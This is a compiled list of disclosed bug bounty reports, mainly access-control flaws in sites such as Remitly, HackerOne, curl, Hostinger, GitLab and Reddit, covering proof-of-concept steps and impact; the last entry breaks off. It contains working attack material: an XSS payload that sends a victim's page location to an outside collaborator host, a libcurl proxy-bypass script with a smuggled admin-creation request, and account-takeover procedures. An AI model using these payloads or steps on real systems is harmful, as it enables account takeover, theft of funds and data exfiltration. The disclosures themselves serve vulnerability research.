This vulnerability could be exploited to achieve stored XSS through cache poisoning and WAF bypass. For example, consider a website with a strict rule that prohibits closing tags (e.g., ``</tag>``) and reflects the ``User-Agent`` header in its responses. The website's WAF returns a 403 error page if the request lacks the header overflow. By manipulating the ``User-Agent`` an attacker could chain these issues to  poison the cache, and achieve stored XSS.

```
[94+ headers with arbitrary data]
1: 1
1: 1
1: 1
1: 1
1: 1
1: 1
User-Agent: </script><svg onload=alert(1)>
Host: victim.com
...
```

##Current Front Line (FL) Behavior: 

As noted in the Cloudflare Ruleset Engine documentation, the current Front Line does not mitigate this issue. Header truncation detection (``http.request.headers.truncated``) is recommended to identify and block requests with excessive headers: https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/http.request.headers.truncated/

> Hi @david96,
w.r.t WAF bypass - the behavior will stay like this with the current Front Line (FL):
https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/http.request.headers.truncated/
After a full migration to our new Front Line layer, WAF will have the capability to inspect/block all headers...


## This report was awarded _$1,250_

---

### [[CRITICAL] 0-Click Account Takeover via Password Reset [AUTH-3243] /orchestrator/v1/password_reset/start](https://hackerone.com/reports/2831902)

- **Report ID:** `2831902`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Remitly
- **Reporter:** @db3wy
- **Bounty:** - usd
- **Disclosed:** 2025-07-21T22:23:32.299Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
A 0-click Account Takeover vulnerability was identified in the password reset functionality of the target website. This flaw allows an attacker to reset the victim's password without any interaction or consent from the victim, leading to a complete compromise of the victim's account.


## Operating System
WINDOWS


## do you use a vpn? if so which one?
NO
## Browser
FIRFOX FOR ATTACKER
Burp Browser for victim


## Steps To Reproduce:
1-----Go to the Password Reset Page:

2-----Navigate to the "Forgot Password" or "Reset Password" section on the website.
         Initiate Password Reset for Both the Victim and the Attacker Account:

3----Enter the victim's email address in the password reset form.
       Also, enter your email address (attacker's email) to initiate a password reset.
         Capture the Password Reset Request:

4-----Intercept the HTTP request using a proxy tool like Burp Suite or OWASP ZAP when submitting the password reset request.


            Analyze the Leaked Information:

To clarify:

Endpoint: /orchestrator/v1/password_reset/start

You need to obtain the JWT token from this specific endpoint.
There are two endpoints with the same name:
One endpoint does not include a JWT token in its response.
The other endpoint includes a JWT token, which is necessary for the attack.
Make sure to target the correct endpoint that provides the JWT token during the password reset process.

Any JWT token belonging to the victim from any other endpoint will not work.

Download a tool for Burp Suite called JSON Web Token. It will make your work easier as it highlights the requests containing the JWT token in green, helping you easily identify the correct endpoint

Only the mentioned 
endpoint /orchestrator/v1/password_reset/start is valid and works for obtaining the necessary JWT for the attack.

This endpoint may not appear on the first attempt; you may need to repeat the process.
As you can see in the recorded video, it appeared for me on the second attempt.





Check the intercepted request and identify sensitive parameters such as:
     AMP_d0cf3ed24c: Contains user information like deviceId, userId, and sessionId.
JWT: JSON Web Token containing the user's email and other information.



save this 2 paramter




5------Enter the One-Time Password (OTP) received on your email or phone to proceed with the password reset.-->>  attacker account
         Modify the HTTP Request:

6------Before sending the password reset request, replace your session data with the victim's session data in the HTTP request:
         Replace the """"AMP_d0cf3ed24c and JWT""""" values with the victim's values obtained from the leaked request.


7--------- Send the Modified Request:


8---Access the Victim's Account:

If successful, you will be able to reset the victim’s password without any interaction from the victim.
Log in using the victim's email address and the new password you have set.



## POC
████
█████

## Impact

##Summary:
The vulnerability discovered allows an attacker to reset the password of a victim's account without requiring any user interaction or special privileges. By intercepting the password reset request and modifying it with the victim's session data, the attacker can successfully take over the account. Additionally, the site allows money transfers, and by exploiting this vulnerability, the attacker can potentially steal funds from victims' accounts.

##Requirements:
Access to the victim's password reset request: Intercepted via tools like Burp Suite or OWASP ZAP.
Knowledge of the victim's session information: This includes tokens such as AMP_d0cf3ed24c and JWT, which are available in the intercepted requests.
Access to the attacker’s own OTP (One-Time Password): The attacker needs their own OTP for the password reset.
Ability to modify HTTP requests: The attacker needs the ability to replace their own session data with the victim’s session data to perform the attack.
##Gained Privilege:
By exploiting this vulnerability, the attacker gains the following privileges:

Full Account Control: The attacker can reset the victim’s password and log in to the account without needing the victim’s credentials.

Access to Confidential Data: The attacker gains access to sensitive information within the victim’s account, including personal details, emails, and other private data.

Manipulation of Account Settings: The attacker can modify account settings, change the email address associated with the account, or perform other actions that would typically require user consent.

Potential to Lock Out the Victim: The attacker can change the password and prevent the victim from accessing their own account, leading to a potential denial of service.

Stealing Funds: Since the site allows money transfers, the attacker can transfer all funds from the compromised accounts to their own, effectively stealing money from the victims.

---

### [Account takeover of existing HackerOne accounts through SCIM provisioning](https://hackerone.com/reports/3178999)

- **Report ID:** `3178999`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** HackerOne
- **Reporter:** @boy_child_
- **Bounty:** - usd
- **Disclosed:** 2025-07-17T14:12:57.135Z
- **CVE(s):** -

**Vulnerability Information:**

After numerous attempts and understanding, I was able to take over existing user accounts through SCIM provisioning.

When using SCIM provisioning, the following must be met:
* Verified domain.
* Working SSO configuration.

Initially, I thought this would automatically be a certain loophole. In my first attempt, this was the procedure used for testing:
1. Import organisation users into Okta.
2. Receive an error stating that existing users don't have matching email domains to the verified one on file.
3. Change the email.
4. Instead, a new user is created in the organisation's users page.

After many attempts, I figured out how to change the sequence to:
1. In Okta, create a user whose email I control, say `attacker@verifed.com`
2. Import organisation users into Okta.
3. Assign the victim account to the created user in step 1.
4. Change the email parameter field to `attacker@verified.com`
5. Change password.
6. Bingo!

I then thought this looked too easy, so I assigned the user access to Okta and tried to log in via SSO, but it failed and did not work. Why?

Two fields in Okta are of importance: `username` and `email`. 

{F4416609}

{F4416611}

* If the attacker with verified domain as `verified.com` adds a victim as `victim@ato.com` to Okta, you will get an error that `ato.com` does not match the H1 verified domain settings.
* If the attacker with a verified domain as `verified.com` adds a victim as `victim@ato.com` to Okta and then changes the username and email to `victim@verified.com`, it will instead create a new user in the H1 organisation.
* If the attacker with verified domain as `verified.com` adds a victim as `victim@ato.com` to Okta, with the username as `victim@ato.com`  and email field as `victim@verifed.com`, the victim's email will be changed, AND no notification will be sent to the victim (issue 2)
* Now the attacker wants to log in. If the attacker wants to do so via the SSO provider (Okta), they can't add the victim to the Okta directory since the username `victim@ato.com` has already been imported and is in use.

{F4416607}

* So the attacker sets a password reset, which also does not send a notification to the user! (issue 3) Rather, the new email is controlled by the attacker.


##Setup:
Before you proceed, have the following setup:
1. A sandbox program setup from [here](https://hackerone.com/teams/new/sandbox) and don't delete the demo members.
2. Contact HackerOne support to activate SSO and SCIM provisioning for your sandbox program.
3. [Set up SSO with Okta](https://docs.hackerone.com/en/articles/8490526-okta-sso-setup-via-saml)
4. [Set up SCIM in Okta](https://docs.hackerone.com/en/articles/9250705-scim-provisioning-for-okta)
5. Added users.

## Steps To Reproduce
1. Go to the Okta directory and add a user with an email you have access to.
2. Go to the Okta application configured for Hackerone SCIM provisioning and import users.
3. In your imported users, assign the user `demo-member@hackerone.com` ( or any other user if the demo member is deleted)
4. Under the Okta application configured for Hackerone SCIM provisioning, tap on the **Assignments** tab, then the pencil icon to edit.

{F4416681}

5. Look for the email field and change it to what you control and in line with your verified domain.

{F4416680}

6. Save.
7. It will automatically sync.
6. Reset the user password, and you should be in.

### Proof of concept:
███

## Impact

Why I think this is so critical is that apart from taking over user accounts, take note of EVERY new organisation,  sandbox alike, there are two users present by default:
 
* Demo Triager `demo-triager@hackerone.com`
* Demo Member `demo-member@hackerone.com`

The above are always present and already members of the sandbox, private, and public organisations unless removed. (I tested on an old sandbox I own, wish I didn't delete them.)

All the attacker has to do is import these default members, leave the username unchanged, change the email, password reset, and they are in!.

---

### [HTTP Proxy Bypass via `CURLOPT_CUSTOMREQUEST` Verb Tunneling](https://hackerone.com/reports/3231321)

- **Report ID:** `3231321`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** curl
- **Reporter:** @alphox
- **Bounty:** - usd
- **Disclosed:** 2025-07-01T14:20:30.177Z
- **CVE(s):** -

**Vulnerability Information:**

### **Summary**

A logic flaw in `libcurl` version **8.14.1** allows an attacker to bypass restrictive HTTP proxy firewalls by "tunneling" an arbitrary HTTP verb within a `CONNECT` request. By setting `CURLOPT_CUSTOMREQUEST` to `CONNECT` for a standard `http://` URL, an attacker can trick `libcurl` into creating a hybrid request. This request is misinterpreted by `CONNECT`-only proxies as a legitimate tunnel setup request and is therefore allowed. Subsequently, `libcurl` sends its request body (e.g., from `CURLOPT_POSTFIELDS`) through this newly established, unfiltered TCP pipe.

This vulnerability effectively defeats network segmentation rules enforced at the proxy layer, enabling an attacker who can control `curl` options (e.g., via SSRF) to send arbitrary data to protected internal services.

| | |
| - | - |
| **Product Name** | libcurl |
| **Affected Version** | **8.14.1** (and likely prior versions) |
| **Vulnerability Class** | CWE-284 Improper access control |
| **CVSS 3.1 Score** | **8.6 (High)** |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N` |

### **Description**

The vulnerability stems from insufficient validation between the user-defined request method and the request type `libcurl` assumes it is making when a proxy is in use.

1.  When a user provides an `http://` URL and a proxy, `libcurl` prepares a standard, non-tunneled proxy request (e.g., `GET http://destination/... HTTP/1.1`).
2.  If the user also sets `CURLOPT_CUSTOMREQUEST` to `"CONNECT internal.host:port HTTP/1.1"`, this custom verb overrides the standard `GET`.
3.  The request line sent to the proxy now begins with `CONNECT`, which satisfies the security rules of a proxy that only permits the `CONNECT` method for establishing tunnels. The proxy allows the request and opens a raw TCP connection to the specified internal host and port.
4.  Because the original URL scheme was `http://`, `libcurl`'s state machine does not enter its formal "HTTPS tunneling" mode. It proceeds as if it were making a `POST`-style request (due to the presence of a request body) and sends the payload down the TCP pipe that the proxy just opened.

This allows an attacker to send arbitrary data directly to an internal service that should have been unreachable.

### **Proof-of-Concept (PoC)**

This PoC demonstrates the bypass using standard command-line tools. It requires three separate terminal sessions.

#### **Step 1: Set up the "Forbidden" Internal Server (Terminal 1)**

This server listens on port 8081. Its purpose is to receive and display the smuggled payload.

```bash
echo "[VICTIM] Listening on 127.0.0.1:8081..."
nc -l -p 8081
```

#### **Step 2: Set up the Restrictive Proxy (Terminal 2)**

This proxy listens on port 8080 and only allows requests that start with `CONNECT`. It responds with a `405 Method Not Allowed` for any other verb.

*   Save this script as `restrictive_proxy.sh` and make it executable with `chmod +x restrictive_proxy.sh`.

    ```bash
    #!/bin/bash
    read -r request_line
    echo "[PROXY] Received: '$request_line'" >&2
    if [[ "$request_line" == "CONNECT"* ]]; then
        echo "[PROXY] Verdict: ALLOWED. Opening tunnel." >&2
        destination=$(echo "$request_line" | awk '{print $2}')
        echo -e "HTTP/1.1 200 Connection established\r\n"
        # Pipe the rest of the client's input to the destination
        nc -w 5 $(echo "$destination" | sed 's/:/ /')
    else
        echo "[PROXY] Verdict: BLOCKED. Sending 405." >&2
        echo -e "HTTP/1.1 405 Method Not Allowed\r\nContent-Length: 0\r\n\r\n"
    fi
    ```

*   Run the proxy in a loop to handle multiple connections:

    ```bash
    while true; do ./restrictive_proxy.sh | nc -l -p 8080; done
    ```

#### **Step 3: Verify the Safeguard (Terminal 3)**

This command proves the proxy correctly blocks normal `GET` requests.

```bash
# This request should fail.
curl -v --proxy http://127.0.0.1:8080 "http://internal-server.local:8081/status"
```
> **Expected Result:** The proxy will respond with `405 Method Not Allowed`, and the `curl` command will fail. The Internal Server will receive no connection.

#### **Step 4: Craft the Attacker's Payload (Terminal 3)**

Create a file named `payload.txt` containing the data to be smuggled.

```bash
echo -e "POST /api/v1/users HTTP/1.1\r\nHost: internal-server.local\r\nContent-Type: application/json\r\n\r\n{\"username\":\"pwned\",\"is_admin\":true}" > payload.txt
```

#### **Step 5: Execute the Bypass Attack (Terminal 3)**

This command uses the vulnerability to bypass the proxy.

```bash
# This request should succeed in tricking the proxy.
curl -v --proxy http://127.0.0.1:8080 \
  --request "CONNECT 127.0.0.1:8081 HTTP/1.1" \
  --data-binary "@payload.txt" \
  "http://ignored-url.com"
```

#### **Step 6: Observe the Result**

-   **Proxy (Terminal 2):** Will print `[PROXY] Verdict: ALLOWED...`, showing it was fooled by the `CONNECT` verb.
-   **Internal Server (Terminal 1):** Will stop waiting and print the contents of `payload.txt`, proving the proxy was bypassed and the malicious payload was delivered to the protected internal resource.
    > ```
    > POST /api/v1/users HTTP/1.1
    > Host: internal-server.local
    > Content-Type: application/json
    > 
    > {"username":"pwned","is_admin":true}
    > ```

### **Impact**

The impact of this vulnerability is **High**. It allows an attacker who can control `libcurl`'s options (a common result of a Server-Side Request Forgery vulnerability) to completely bypass network egress filtering rules enforced by `CONNECT`-only proxies. This can lead to:

-   **Internal Network Pivoting:** An attacker can use a public-facing application as a pivot point to send arbitrary commands to internal, non-routable services such as databases, internal APIs, or cloud metadata services.
-   **Data Exfiltration:** The established tunnel can be used to exfiltrate sensitive data from compromised internal systems.
-   **Firewall and WAF Bypass:** Application-layer firewalls on the proxy that are designed to inspect `GET` and `POST` requests are rendered ineffective, as the attacker's payload is sent over a raw TCP pipe that the proxy is not configured to inspect.

This turns a potentially moderate-risk SSRF flaw into a critical internal network access vector, significantly elevating the overall risk to an organization's infrastructure.

### **Suggested Mitigation**

The logic in `lib/http.c` should be hardened to create a stronger link between the URL's scheme and the allowed HTTP method when a proxy is in use. A recommended fix would be:

If an `http://` URL is used with a proxy, `libcurl` should explicitly forbid `CURLOPT_CUSTOMREQUEST` from being set to `CONNECT`. The `CONNECT` method should only be used by `libcurl`'s internal tunneling logic when an `https://` URL is being proxied, and it should not be a user-controllable verb for standard `http://` proxy requests. This would close the logical gap that allows this bypass.

## Impact

## Summary:
The impact of this vulnerability is **High**. It allows an attacker who can control `libcurl`'s options (a common result of a Server-Side Request Forgery vulnerability) to completely bypass network egress filtering rules enforced by `CONNECT`-only proxies. This can lead to:

-   **Internal Network Pivoting:** An attacker can use a public-facing application as a pivot point to send arbitrary commands to internal, non-routable services such as databases, internal APIs, or cloud metadata services.
-   **Data Exfiltration:** The established tunnel can be used to exfiltrate sensitive data from compromised internal systems.
-   **Firewall and WAF Bypass:** Application-layer firewalls on the proxy that are designed to inspect `GET` and `POST` requests are rendered ineffective, as the attacker's payload is sent over a raw TCP pipe that the proxy is not configured to inspect.

This turns a potentially moderate-risk SSRF flaw into a critical internal network access vector, significantly elevating the overall risk to an organization's infrastructure.

---

### [Unauthorized coins transfer from locking account(s)](https://hackerone.com/reports/2976481)

- **Report ID:** `2976481`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Cosmos
- **Reporter:** @unknown_feature
- **Bounty:** - usd
- **Disclosed:** 2025-06-29T12:30:23.220Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary of Impact
An attacker can transfer money from the locking account they don't own(if the account has unlocked funds, can be after locking period is over). The POC is done for `periodic-locking-account`. But it seems like more locking accounts are affected because the issue seems to be in [SendCoins](https://github.com/cosmos/cosmos-sdk/blob/7e391959b9aebf055294b24b7f392346709dae64/x/accounts/defaults/lockup/lockup.go#L285-L284).  And it's used by all of them. When it calls the function it passes sender from the message `msg.Sender` in [checkSender](https://github.com/cosmos/cosmos-sdk/blob/7e391959b9aebf055294b24b7f392346709dae64/x/accounts/defaults/lockup/lockup.go#L333) it checks that the sender == owner. But the issue here is that msg.Sender is not validated anywhere bc this message is packed into [MsgExecute](https://github.com/cosmos/cosmos-sdk/blob/7e391959b9aebf055294b24b7f392346709dae64/api/cosmos/accounts/v1/tx.pulsar.go#L4444-L4443).  While executing it sets original sender into the [context ](https://github.com/cosmos/cosmos-sdk/blob/7e391959b9aebf055294b24b7f392346709dae64/x/accounts/keeper.go#L284). And in case of multisig account it correctly takes it from [ctx](https://github.com/cosmos/cosmos-sdk/blob/7e391959b9aebf055294b24b7f392346709dae64/x/accounts/defaults/multisig/account.go#L168) . At least in those places I looked at. But these locking accounts take it from the message. And it can be anything. 

#### POC scenario

1. We first create a periodic-locking-account at  the [victim ](https://gist.github.com/unknownfeature/d0b8cfcf263904d9be4707dded38c706#file-main-rs-L28). Locking period is small so we wouldn't wait long.
2. Then we wait for locking period to end and transfer money to the [attacker](https://gist.github.com/unknownfeature/d0b8cfcf263904d9be4707dded38c706#file-main-rs-L55)

### Steps to Reproduce
Go and Rust required

1. Checkout latest version of [cosmos-sdk](https://github.com/cosmos/cosmos-sdk) and run `make build`. Note the path to binariy and when it's done replace the path [in setup_chain](https://gist.github.com/unknownfeature/d0b8cfcf263904d9be4707dded38c706#file-setup_chain-L18).

 2. Create rust project with attached `Cargo.toml`.  Download all attached *.rs files and put them into `src` folder.

 3. Make sure setup_chain has execute permission. Run `./setup_chain`.  Wait for it to start. And then run the rust project. See the POC video.
{F4027705}

### Workarounds
Doesn't seem like there are any

### Supporting Material/References
1. setup_chain - script that sets up and starts the chain
2. main.rs, types.rs, client.rs, func.rs, msg.rs and Cargo.toml the attack itself. Sorry there are a lot of files. I'll probably push it all somewhere and update the report. 
3. attack.mov - the video of POC

## Impact

An attacker can take over someone's funds that were locked and then unlocked on the locking account. The POC particularly demonstrates `periodic-locking-account`.  But there are reasons to believe more locking accounts are affected.

---

### [1 Click Account Takeover via Auth Token Theft on marketing.hostinger.com](https://hackerone.com/reports/3081691)

- **Report ID:** `3081691`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** hostinger 
- **Reporter:** @aziz0x48
- **Bounty:** - usd
- **Disclosed:** 2025-06-06T12:10:25.393Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hey Paul, hope you're doing good !

I discovered a One Click Account Takeover vulnerability in Hostinger through the ```marketing.hostinger.com``` subdomain. Since this subdomain is part of hostinger.com and is whitelisted for redirects, an attacker can exploit it to steal Hostinger users’ auth tokens and gain full access to their accounts with just a single click from the victims !

## Steps To Reproduce:

  -  Login in to the victim's account and visit the URL below, replace the attacker-url with your own burp collaborator url or your own dedicated server url:

```

https://auth.hostinger.com/login/?redirectUrl=https%3A%2F%2Fmarketing.hostinger.com%2Fen-us%2Fmarketplace_wix%2Fsite_not_published%3Fredirect_url%3Dx%22%3E%3C%2Fa%3E%3Cscript%3Efetch%28%27https%3A%2F%2Fwqqf8xerhgrhdk251cesqastbkhb54xsm.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2Cbody%3A%20window.location%7D%29%3C%2Fscript%3E

## Decoded URL:

https://auth.hostinger.com/login/?redirectUrl=https://marketing.hostinger.com/en-us/marketplace_wix/site_not_published?redirect_url=x"></a><script>fetch('wqqf8xerhgrhdk251cesqastbkhb54xsm.oastify.com',%20{method:%20'POST',body:%20window.location});</script>

```

  -  Check burp collaborator / server logs for the victim's account auth token :

{F4227740}

  -  The attacker can use the leaked auth token to generate a valid JWT for the victim's account and have complete control over the victim's account using the following request:

```
POST /hpanel/auth/auth-token HTTP/2
Host: builder-backend.hostinger.com
User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/132.0
Origin: https://builder.hostinger.com
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Te: trailers
```

{F4227728}

██████

## Suggestion:
I believe that ```marketing.hostinger.com```  has been rebranded as ```rankingcoach.com```. Therefore, it would be best to either shut down the marketing subdomain or remove it from the whitelisted domains. This would be a quick and easy fix to mitigate the issue and enhance users security.

Thank you,
@aziz0x48

## Supporting Material/References:
Please refer to the attached screenshots and video.

## Impact

This vulnerability poses a significant risk to Hostinger users, as it allows attackers to bypass authentication and gain unauthorized access to accounts with just one click. By exploiting the ```marketing.hostinger.com``` subdomain, which is whitelisted for redirects, attackers can steal authentication tokens from users. Once the tokens are compromised, the attacker gains full access to the victim’s Hostinger account, including critical services such as hPanel, website builder, VPS servers, email, and personal data. This flaw puts all Hostinger users at risk of account takeover, data theft, and potential misuse of sensitive information, making it a serious security concern that requires immediate attention.

---

### [unauthorized access and add user and change personal information all users](https://hackerone.com/reports/2828641)

- **Report ID:** `2828641`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Mars
- **Reporter:** @bughunter0x7
- **Bounty:** - usd
- **Disclosed:** 2025-05-27T20:53:18.359Z
- **CVE(s):** -

**Summary (team):**

The report describes a vulnerability in the ██████████  website, where unauthorized access to an API endpoint allows attackers to add new users and modify personal information of existing users. The vulnerability is classified as Improper Access Control. The issue stems from the absence of proper authentication and authorization mechanisms on the ██████████  endpoint, which handles user registration and profile updates. This vulnerability allows anyone to create new user accounts or modify existing user information without requiring any authentication. Additionally, the vulnerability is compounded by a predictable user identifier system (4-digit codes) that can be easily enumerated through brute force methods to identify valid user profiles through the ██████████  endpoint.

---

### [change part of personal information all users](https://hackerone.com/reports/2828693)

- **Report ID:** `2828693`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Mars
- **Reporter:** @bughunter0x7
- **Bounty:** - usd
- **Disclosed:** 2025-05-12T15:13:38.039Z
- **CVE(s):** -

**Summary (team):**

The report describes a vulnerability in the ██████████  website, where unauthorized access to an API endpoint allows attackers to add new users and modify personal information of existing users. The vulnerability is classified as Improper Access Control. The issue stems from the absence of proper authentication and authorization mechanisms on the ██████████  endpoint, which handles user registration and profile updates. This vulnerability allows anyone to create new user accounts or modify existing user information without requiring any authentication. Additionally, the vulnerability is compounded by a predictable user identifier system (4-digit codes) that can be easily enumerated through brute force methods to identify valid user profiles through the ██████████  endpoint.

---

### [Privilege Escalation in Edit and Create Secret Endpoints Leads to Unauthorized Secret Modification](https://hackerone.com/reports/3103755)

- **Report ID:** `3103755`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Dust
- **Reporter:** @0xsom3a
- **Bounty:** - usd
- **Disclosed:** 2025-04-24T06:43:15.062Z
- **CVE(s):** -

**Vulnerability Information:**

#Summary

A user with the **Builder** role — a role that is **not expected** to manage secrets — can:

- ✅ **List all existing secret names** in the workspace.
- ✅ **Create new secrets**.
- ✅ **Overwrite existing secrets** simply by using the same name.

This behavior **violates permission boundaries** and  leads to **privilege escalation**, **tampering with app configurations**, or **unauthorized access to sensitive data**.

---

# Steps to Reproduce

##Step-1 :  Get All Secret Names in the Workspace

As a **Builder**, send a `GET` request to the secrets endpoint to enumerate all existing secret names.

```http
GET /api/w/[workspace_id]/dust_app_secrets HTTP/2  
Host: dust.tt  
Cookie: [appSession]
```

This returns a list of secrets with their `id`, `name`, `created_at`, etc. — but without showing the secret `value`.

```json
{
  "secrets": [
    { "name": "NAME-1", "value": "•••••••" },
    { "name": "NAME-2", "value": "•••••••" }
  ]
}

```


##**Step-2 :** Create or Overwrite a Secret

Now, send a `POST` request to create a new secret.


```json
POST /api/w/[workspace_id]/dust_app_secrets HTTP/2  
Host: dust.tt  
Content-Type: application/json  
Cookie: [appSession]

{
  "name": "NAME-1",
  "value": "malicious-value"
}
```

#### Behavior:
- If the `name` used in the request **already exists** in the workspace (as returned from step 1), the system will **overwrite the existing secret's value**.
- If the `name` is **new**, a new secret will be created.

-  No error or warning is shown — overwrite happens silently.

---

#POC Video:

██████


---

# Expected Behavior

The **Builder** role should:

-  Not be able to access the list of secret names.
-  Not be able to create or update any secrets.

---

# Suggested Fix

- Enforce strict permission checks on all secret-related endpoints.
- Ensure only users with elevated roles (e.g., Admin, Owner) can list, create, or update secrets.

## Impact

This vulnerability allows users with the **Builder** role to:

-  Discover all secret names in the workspace.
-  Tamper with or overwrite secrets used by other users or apps.
-  Create new secrets and potentially trick other users into using them.
-  Escalate privileges by modifying secrets used in sensitive flows (e.g., API keys, tokens, credentials).

This could lead to:

- Configuration manipulation  
- Account compromise  
- Supply chain attacks on internal tooling  
- Loss of integrity of secret data

---

### [Admin Dashboard Access Leads to Updating Merchant Info](https://hackerone.com/reports/2801787)

- **Report ID:** `2801787`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** MTN Group
- **Reporter:** @tinopreter
- **Bounty:** - usd
- **Disclosed:** 2025-03-02T13:53:28.628Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The ███████ application provides access to 3(Merchant, Supervisor, Admin) classes of users. Looking at the Admin side, its clear only permitted admins can login to the portal since nothing on the UI indicates a register feature. However I was able to find a registration endpoint to sign up. Now I have access to the Admin dashboard. Based on the functionalities there, it's evident an outsider shouldn't have access to this.

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Visit ████████ and signup
  2. Login at ██████ and you will be redirected to the admin dashboard where you can approve or decline transactions.
██████   
  3. At ███████, you can see a list of registered Merchant accounts in the application.    
███████  

  You can edit their data, 
`Change their account credentials`
`change their account number to an attacker's: thereby 
  receiving payments made to them`,  
`disable` or `delete` their account, etc.  
██████    
█████████

##!EDIT

Initially my report focused on the merchants, however it affects, Cashiers, Stations and Supervisors also. You can edit and delete their data also by navigating the the URLs below:  

███████
█████████
█████████   

#IMPORTANT
You can see the passcode for various supervisor accounts at
███   
█████████

## Impact

Direct access to admin functionalities, where an attacker can modify merchant financial account information, disable and delete account of MTN clients. An outsider like myself shouldn't have access to this.

**Summary (researcher):**

A hidden registration endpoint allowed an attacker to sign up for an admin portal, granting access to all registered merchant information. With administrative control over this data, the attack possibilities were endless. The MTN team quickly responded and restricted access to internal users only.

---

### [Account Takeover via Password Reset without user interactions](https://hackerone.com/reports/2293343)

- **Report ID:** `2293343`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** GitLab
- **Reporter:** @asterion04
- **Bounty:** 35000 usd
- **Disclosed:** 2025-02-26T06:29:57.904Z
- **CVE(s):** -

**Summary (team):**

@asterion04 submitted a report to GitLab.

Summary

I found a way to change the password of a GitLab account via the password reset form and successfully retrieve the final reset link without user interactions, using just its email address.
Steps to reproduce

Go to "Forgot Your Password?" link
Enter the victim's email and intercept the submit request via Burp Suite .
Then right-click on the HTTP Editor inside Burp Suite and select Extensions -> Content-Type Converter -> Convert to JSON (make sure to have the Content-Type Converter plugin installed from the BApp Store)
Now replace this converted JSON line `` "user[email]":"victim@gmail.com"``, to

```
 "user" {
     "email" [
              "victim@gmail.com",
              "attacker@gmail.com"
       ]
 },
```

Forward the requests and you should get an email containing the reset link that was send to both emails (``victim@gmail.com`` and ``attacker@gmail.com``) .
Click on the reset link, change the password and done, you can now login as the victim using the new password.

Impact

By just knowing the victim email address used on GitLab, you can takeover his account by changing his password without user interaction since the attacker get the same email as the victim.

---

### [Exposed proxy allows to access internal reddit domains](https://hackerone.com/reports/2967634)

- **Report ID:** `2967634`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Reddit
- **Reporter:** @la_revoltage
- **Bounty:** 7500 usd
- **Disclosed:** 2025-02-24T15:03:45.189Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Proxy at https://52.90.28.77:30920 allows to access internal domains

## Steps To Reproduce:
To reproduce, simply use this curl command
  ```
curl --insecure https://52.90.28.77:30920/reddit --header "Host: █████████"
```


## Supporting Material 
snoo.dev is obviously an internal domains used by employees:
https://search.censys.io/search?resource=certificates&q=snoo.dev

It is also references in the GitHub a few times:
https://github.com/search?q=org%3Areddit%20snoo.dev&type=code

## Impact

Attacker can access internal domains

---

### [Applicant security exam Attachments/Documents accessible through an IDOR/BAC on the custom Apex controller on https://█████.mil ](https://hackerone.com/reports/2950536)

- **Report ID:** `2950536`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @oxylis
- **Bounty:** - usd
- **Disclosed:** 2025-02-12T20:55:26.602Z
- **CVE(s):** -

**Vulnerability Information:**

Greetings DoD team,

I've uncovered a highly dangerous IDOR on the ██████████ portal.

An attacker can switch the ownership of any Attachment record submitted through the portal and access the files. These contain highly sensitive information as they include all materials/documentation submitted as part of the vetting procedures prior to visiting the █████, e.g. personal medical records. Potentially this might include internal attachments as well.

An attacker is able to exploit the following chain:

1. Generate/enumerate a list of Salesforce Attachment Id's. These are highly predictable: example methodology/script here: https://blog.hypn.za.net/2022/11/12/Hacking-Salesforce-backed-WebApps/.
2. Plug the generated list of Id's into the broken Apex controller (apex://ExAM.FileUploadController/ACTION$cloneAttachment), clone any Attachment record within the CRM and link it to a record they own (e.g. their own Contact). This gives read access to the record. 
3. Download the newly-linked Attachment as their own via a servlet/servlet.FileDownload?file=* request.

**IMPORTANT NOTE: unfortunately during testing inadvertent access was gained to a confidential record (https://██████████.mil/Portal██████████/servlet/servlet.FileDownload?file=00PRw000000MaT3MAK). Please remove the link to the test Contact as a matter of urgency. Apologies!**

## Impact

High-impact sensitive data leak.

## System Host(s)
██████.mil

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
#  Steps to reproduce/POC

1. Create a new ███████ request: https://███████.mil/Portal██████/s/████████-creation
2. After submitting the form, verify the account by following the link received in email (Welcome to Your ████████ Reservation Portal My████s Account...)
3. After changing the password and logging into ██████.mil/Portal████/s/, find any POST request with aura.token present in the HTTP traffic, e.g:

```
POST /Portal████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
Host: █████.mil
